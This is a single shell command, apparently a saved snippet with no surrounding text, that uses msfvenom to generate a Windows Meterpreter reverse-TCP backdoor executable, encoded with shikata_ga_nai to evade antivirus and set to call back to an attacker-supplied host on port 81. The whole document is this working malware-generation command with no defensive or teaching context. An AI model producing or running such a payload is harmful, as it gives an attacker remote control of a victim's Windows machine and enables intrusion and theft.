msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe > Bureau/backdoor.exe LHOST=$ip LPORT=81
